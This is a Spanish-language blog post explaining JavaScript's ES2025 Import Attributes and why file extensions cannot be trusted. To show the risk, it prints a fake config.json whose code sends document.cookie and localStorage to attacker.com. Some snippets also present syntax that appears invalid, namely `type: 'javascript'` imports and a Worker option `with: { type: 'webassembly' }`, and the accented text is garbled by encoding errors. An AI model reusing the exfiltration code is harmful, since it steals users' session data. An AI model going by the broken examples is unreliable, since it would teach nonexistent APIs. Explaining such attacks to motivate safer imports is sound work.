---
title: "Lo nuevo de JavaScript ES2025: Import Attributes"
description: Comprendiendo su nueva sintaxis y por qu√© no podemos fiarnos solo de las extensiones de archivo.
date: 2024-11-22T21:33:25.684Z
update: 2025-01-22T21:13:59.142Z
hero: ./js-es2025.svg
heroAlt: JavaScript ES2025
og: ./js-es2025.png
tags:
  - Programaci√≥n
  - JavaScript
  - ES2025
  - JSON
sources:
  - title: JavaScript Import Attributes (ES2025) - Trevor I. Lasn
    href: https://www.trevorlasn.com/blog/import-attributes-in-javascript
  - title: Import Attributes - TC39
    href: https://tc39.es/proposal-import-attributes/
  - title: Import Attributes - TC39 (GitHub)
    href: https://github.com/tc39/proposal-import-attributes
themeColor: "#f0db4f"
---
import { BaselineStatus } from '@/components/BaselineStatus';

<BaselineStatus id="json-modules" />

JavaScript incorpora una nueva funci√≥n que hace que las importaciones de m√≥dulos sean m√°s expl√≠citas y seguras. Los **Import Attributes** a√±aden una forma de pasar metadatos sobre cualquier m√≥dulo que estemos importando, ya sea JSON, JavaScript u otros tipos de m√≥dulos.

## ‚ùå El problema

En Internet, las extensiones de archivo no indican el contenido de forma fiable. Un servidor puede devolver JavaScript cuando usted espera JSON:

```js title="main.js"
// Parece seguro, pero podr√≠a ser peligroso ‚ò¢Ô∏è
import config from './config.json';
```

```js title="config.json"
// El servidor podr√≠a responder con c√≥digo ejecutable:
export default (function () {
  // Ejecuci√≥n inesperada de c√≥digo üíÄ
})();
```

## üí° La soluci√≥n: Import Attributes

Los Import Attributes crean un contrato entre el c√≥digo y el tiempo de ejecuci√≥n. Declaras expl√≠citamente qu√© tipo de m√≥dulo esperas:

```js
// Requerir JSON expl√≠citamente
import config from './config.json' with { type: 'json' };

// O especificar JavaScript
import module from './module.js' with { type: 'javascript' };

// Tambi√©n funciona con importaciones din√°micas
const data = await import('./config.json', {
  with: { type: 'json' }
});
```

La sintaxis funciona de forma coherente en diferentes contextos de m√≥dulos:

```js
// Re-exportaci√≥n con atributos
export { data } from './data.json' with { type: 'json' };

// Instanciaci√≥n de Web Worker
new Worker('processor.wasm', {
  type: 'module',
  with: { type: 'webassembly' }
});
```

## üí≠ ¬øPor qu√© los Import Attributes?

El principal problema es la seguridad. En Internet, las extensiones de archivo no indican el contenido de forma fiable. Una URL que termine en `json` podr√≠a en realidad servir JavaScript:

```js title="main.js"
// Carga de la configuraci√≥n de la API
import apiConfig from './api-config.json';

// Lo que esperas obtener:
{
  "apiKey": "secret-key",
  "endpoint": "https://api.example.com",
  "timeout": 5000
}
```

```js title="api-config.json"
// Lo que un servidor comprometido podr√≠a enviar en su lugar:
export default (function () {
  // Env√≠a tus claves API a un atacante
  fetch('https://attacker.com', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: window.localStorage
    })
  });

  // Luego devuelve lo que parece una configuraci√≥n normal
  return {
    apiKey: 'secret-key',
    endpoint: 'https://api.example.com',
    timeout: 5000
  }
})();
```

Los Import Attributes hacen que nuestro sistema de m√≥dulos sea m√°s expl√≠cito y seguro. Los m√≥dulos JSON no pueden ejecutar c√≥digo, son datos puros. Cuando marcas un m√≥dulo con `type: "json"`, est√°s garantizado que obtendr√°s datos JSON o un error, nunca c√≥digo ejecutable.

El impacto m√°s inmediato se produce en las importaciones JSON, donde la seguridad es crucial:

```js
// Archivos de configuraci√≥n
import config from './config.json' with { type: 'json' };

// Configuraci√≥n din√°mica
const config = await import(
  `./config.${env}.json`,
  { with: { type: 'json' } }
);
```

Esta caracter√≠stica crea una base para manejar con seguridad diferentes tipos de m√≥dulos en JavaScript. Cuando llegue en 2025, dispondremos de una forma est√°ndar de declarar nuestras expectativas sobre los m√≥dulos en todos los entornos JavaScript.

Piensa en ello como si a√±adieras seguridad de tipos a tus importaciones de m√≥dulos, no para los datos dentro de los m√≥dulos, sino para los propios m√≥dulos.
